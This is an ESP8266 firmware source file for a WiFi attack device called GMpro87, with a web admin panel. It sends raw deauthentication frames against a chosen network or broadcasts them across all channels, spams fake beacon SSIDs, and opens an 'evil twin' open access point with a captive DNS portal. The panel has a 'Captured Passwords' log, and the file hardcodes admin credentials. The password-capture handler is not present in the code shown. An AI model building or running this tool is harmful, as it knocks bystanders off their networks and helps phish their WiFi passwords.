#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>
#include <DNSServer.h>

extern "C" {
  #include "user_interface.h"
}

// ================= CONFIG & STATE =================
String admin_ssid = "GMpro87";
String admin_pass = "Sangkur87";
int beacon_count = 50;
bool rusuh_mode = false;
bool deauth_running = false;
bool beacon_running = false;
bool attack_all = false;
String selected_bssid = ""; 
String selected_ssid = "";
uint8_t target_ch = 1;
uint8_t admin_ch = 1; // KUNCI UTAMA DISINI

ESP8266WebServer server(80);
DNSServer dnsServer;

// ================= RAW PACKETS =================
uint8_t deauthPacket[26] = {
  0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x01, 0x00
};

uint8_t beaconPacket[128] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x11, 0x00, 0x00, 0x08 };

// ================= ATTACK LOGIC =================
void sendDeauth(String bssid_str) {
  uint8_t bssid[6];
  for (int i = 0; i < 6; i++) bssid[i] = strtol(bssid_str.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  uint8_t macAddr[6];
  WiFi.softAPmacAddress(macAddr);
  if (memcmp(bssid, macAddr, 6) == 0) return;
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);
  wifi_send_pkt_freedom(deauthPacket, 26, 0);
}

void spamBeacon() {
  for (int i = 0; i < beacon_count; i++) {
    String fakeSsid = "GMpro_Attack_" + String(random(100, 999));
    beaconPacket[37] = fakeSsid.length();
    memcpy(&beaconPacket[38], fakeSsid.c_str(), fakeSsid.length());
    wifi_send_pkt_freedom(beaconPacket, 38 + fakeSsid.length(), 0);
    yield();
  }
}

// ================= UI ADMIN =================
const char INDEX_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>GMpro87 - Admin Panel</title>
<style>
body{font-family:'Segoe UI',Roboto,sans-serif;background-color:#000;color:#fff;margin:0;padding:0;user-select:none;-webkit-tap-highlight-color:transparent;}
.header{text-align:center;padding:15px 10px;background:#050505;border-bottom:2px solid #FFC72C;}
.logo-main{font-size:35px;font-weight:bold;color:#FFC72C;text-shadow:2px 2px #ff0000;margin:0;letter-spacing:2px;}
.logo-dev{font-size:12px;color:#aaa;letter-spacing:3px;margin-top:2px;}
.tabs{display:flex;background:#111;border-bottom:1px solid #333;position:sticky;top:0;z-index:100;overflow-x:auto;}
.tab{flex:1;padding:12px 15px;text-align:center;cursor:pointer;font-weight:bold;color:#888;font-size:11px;white-space:nowrap;}
.tab.active{color:#fff;background:#1a1a1a;border-bottom:3px solid #FF033E;}
.container{padding:12px;max-width:100%;margin:auto;}
.content{display:none;}.content.active{display:block;}
.table-wrapper{overflow-x:auto;border:1px solid #146dcc;border-radius:4px;margin-bottom:10px;}
table{width:100%;border-collapse:collapse;background:#000;}
th,td{padding:8px 4px;text-align:center;border:1px solid #146dcc;font-size:11px;}
th{background-color:rgba(20,109,204,0.3);color:#FFC72C;}
.card{background:#0a0a0a;border:1px solid #222;padding:15px;border-radius:8px;margin-bottom:12px;}
h3{margin:0 0 10px 0;font-size:14px;color:#FFC72C;border-bottom:1px solid #333;padding-bottom:5px;}
input,select{width:100%;padding:10px;margin-top:4px;background:#151515;color:#fff;border:1px solid #333;border-radius:4px;font-size:13px;box-sizing:border-box;}
.btn{display:block;padding:12px;border:none;border-radius:5px;color:white;font-weight:bold;cursor:pointer;font-size:11px;text-transform:uppercase;text-align:center;width:100%;box-sizing:border-box;}
.btn-scan{background:#146dcc;margin-bottom:10px;}
.btn-deauth{background:#FF033E;}
.btn-evil{background:#A55F31;}
.btn-beacon{background:#b414cc;}
.btn-save{background:#0C873F;}
.btn-select{background:#eb3489;padding:6px;font-size:10px;width:auto;display:inline-block;}
.btn-rusuh{background:linear-gradient(45deg,#FF033E,#b414cc);}
.btn-deselect{background:#444;}
.action-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:10px;}
.log-box{background:#050505;border:1px dashed #FFC72C;padding:8px;height:160px;color:#0f0;font-family:monospace;font-size:11px;overflow-y:auto;white-space:pre-wrap;}
</style></head>
<body>
    <div class="header"><h1 class="logo-main">GMpro87</h1><div class="logo-dev">dev : 9u5M4n9</div></div>
    <div class="tabs">
        <div class="tab active" onclick="showTab(event,'tab-scan')">SCANNER</div>
        <div class="tab" onclick="showTab(event,'tab-set')">SETTINGS</div>
        <div class="tab" onclick="showTab(event,'tab-file')">ET-FILES</div>
        <div class="tab" onclick="showTab(event,'tab-log')">PASS-LOGS</div>
    </div>
    <div class="container">
        <div id="tab-scan" class="content active">
            <button class="btn btn-scan" onclick="location.href='/scan'">RE-SCAN WIFI</button>
            <div class="table-wrapper"><table><thead><tr><th width="40%">SSID</th><th width="10%">CH</th><th width="30%">RSSI</th><th width="20%">ACT</th></tr></thead><tbody>%WIFI_LIST%</tbody></table></div>
            <button class="btn btn-deselect" onclick="location.href='/deselect'" style="margin-bottom:8px;">DESELECT ALL</button>
            <div class="action-grid">
                <button class="btn btn-deauth" onclick="location.href='/attack?type=deauth'">DEAUTH</button>
                <button class="btn btn-evil" onclick="location.href='/attack?type=hotspot'">EVIL TWIN</button>
                <button class="btn btn-deauth" style="background:#8b0000;" onclick="location.href='/attack?type=deauthall'">DEAUTH ALL</button>
                <button class="btn btn-beacon" onclick="location.href='/attack?type=beacon'">BEACON SPAM</button>
                <button class="btn btn-rusuh" onclick="location.href='/attack?type=rusuh'" style="grid-column: span 2;">MASS DEAUTH (RUSUH MODE)</button>
            </div>
        </div>
        <div id="tab-set" class="content">
            <div class="card">
                <h3>Admin & Attack Config</h3>
                <form action="/save" method="POST">
                    <label>Admin SSID</label><input type="text" name="adm_ssid" value="%ADM_SSID%">
                    <label>Admin Password</label><input type="password" name="adm_pass" value="%ADM_PASS%">
                    <label>Beacon Spam Count</label><input type="number" name="b_count" value="%B_COUNT%">
                    <button type="submit" class="btn btn-save" style="margin-top:15px">SAVE & APPLY</button>
                </form>
                <button onclick="location.href='/reboot'" class="btn btn-deselect" style="margin-top:10px;background:#721c24;color:white;">REBOOT DEVICE</button>
            </div>
        </div>
        <div id="tab-file" class="content"><div class="card"><h3>Upload Template</h3><form action="/upload" method="POST" enctype="multipart/form-data"><input type="file" name="upload" accept=".html"><button type="submit" class="btn btn-scan" style="margin-top:10px;">UPLOAD HTML</button></form></div></div>
        <div id="tab-log" class="content"><div class="card"><h3>Captured Passwords</h3><div class="log-box">%LOG_CONTENT%</div><button onclick="location.href='/clear'" class="btn btn-deauth" style="margin-top:15px">CLEAR ALL LOGS</button></div></div>
    </div>
    <script>
        function showTab(e,n){var i,c,t;c=document.getElementsByClassName("content");for(i=0;i<c.length;i++)c[i].classList.remove("active");t=document.getElementsByClassName("tab");for(i=0;i<t.length;i++)t[i].classList.remove("active");document.getElementById(n).classList.add("active");e.currentTarget.classList.add("active");}
    </script>
</body></html>
)rawliteral";

// ================= HANDLERS =================
String processor(const String& var) {
  if (var == "WIFI_LIST") {
    String list = ""; int n = WiFi.scanComplete();
    if (n > 0) {
      for (int i = 0; i < n; ++i) {
        String ssid = WiFi.SSID(i); if (ssid == "") ssid = "HIDDEN";
        String sel = (WiFi.BSSIDstr(i) == selected_bssid) ? "style='color:#FF033E;'" : "";
        list += "<tr " + sel + "><td style='text-align:left;'>"+ssid+"</td><td>"+String(WiFi.channel(i))+"</td><td>"+String(WiFi.RSSI(i))+"</td><td><button class='btn btn-select' onclick=\"location.href='/?ap="+WiFi.BSSIDstr(i)+"&ch="+String(WiFi.channel(i))+"&ssid="+ssid+"'\">SEL</button></td></tr>";
      }
    } else return "<tr><td colspan='4'>Scan dulu Bos...</td></tr>";
    return list;
  }
  if (var == "LOG_CONTENT") { File f = LittleFS.open("/pass.txt", "r"); if (!f) return "No Logs."; String s = f.readString(); f.close(); return s; }
  if (var == "ADM_SSID") return admin_ssid;
  if (var == "ADM_PASS") return admin_pass;
  if (var == "B_COUNT") return String(beacon_count);
  return "";
}

void setup() {
  Serial.begin(115200); LittleFS.begin();
  
  // STEP FIX: Bersihin radio dulu
  WiFi.disconnect();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP_STA);
  
  // PAKSA CHANNEL 1 BIAR STABIL
  WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str(), 1); 
  admin_ch = 1;
  
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", []() {
    if (server.hasArg("ap")) { selected_bssid = server.arg("ap"); target_ch = server.arg("ch").toInt(); selected_ssid = server.arg("ssid"); }
    String html = INDEX_HTML;
    html.replace("%WIFI_LIST%", processor("WIFI_LIST")); html.replace("%LOG_CONTENT%", processor("LOG_CONTENT"));
    html.replace("%ADM_SSID%", admin_ssid); html.replace("%ADM_PASS%", admin_pass); html.replace("%B_COUNT%", String(beacon_count));
    server.send(200, "text/html", html);
  });

  server.on("/scan", []() { 
    wifi_promiscuous_enable(0); // Matikan deauth pas lagi scan
    WiFi.scanNetworks(true, true); 
    server.sendHeader("Location", "/"); 
    server.send(302); 
  });

  server.on("/attack", []() {
    String t = server.arg("type");
    if (t == "deauth") deauth_running = !deauth_running;
    if (t == "rusuh") rusuh_mode = !rusuh_mode;
    if (t == "beacon") beacon_running = !beacon_running;
    if (t == "deauthall") attack_all = !attack_all;
    if (t == "hotspot") WiFi.softAP(selected_ssid.c_str(), ""); 
    
    if(deauth_running || rusuh_mode || attack_all) wifi_promiscuous_enable(1);
    else wifi_promiscuous_enable(0);
    
    server.sendHeader("Location", "/"); server.send(302);
  });

  server.on("/deselect", []() { selected_bssid = ""; selected_ssid = ""; deauth_running = false; server.sendHeader("Location", "/"); server.send(302); });
  server.on("/save", HTTP_POST, []() {
    admin_ssid = server.arg("adm_ssid"); admin_pass = server.arg("adm_pass");
    beacon_count = server.arg("b_count").toInt(); 
    WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str(), 1);
    server.sendHeader("Location", "/"); server.send(302);
  });

  server.on("/clear", []() { LittleFS.remove("/pass.txt"); server.sendHeader("Location", "/"); server.send(302); });
  server.on("/reboot", []() { ESP.restart(); });
  server.onNotFound([]() { server.sendHeader("Location", "/", true); server.send(302, "text/plain", ""); });
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  
  if (deauth_running && selected_bssid != "") {
    wifi_set_channel(target_ch);
    sendDeauth(selected_bssid);
    yield();
    wifi_set_channel(admin_ch); // Langsung balik ke channel admin biar HP gak putus
  }
  
  if (rusuh_mode || attack_all) {
    static unsigned long last_hop = 0;
    if (millis() - last_hop > 150) { 
      static uint8_t ch = 1;
      wifi_set_channel(ch);
      sendDeauth("FF:FF:FF:FF:FF:FF");
      ch++; if (ch > 13) ch = 1;
      last_hop = millis();
      yield();
      wifi_set_channel(admin_ch); // Balik lagi ke admin
    }
  }
  
  if (beacon_running) { spamBeacon(); yield(); }
  yield();
}
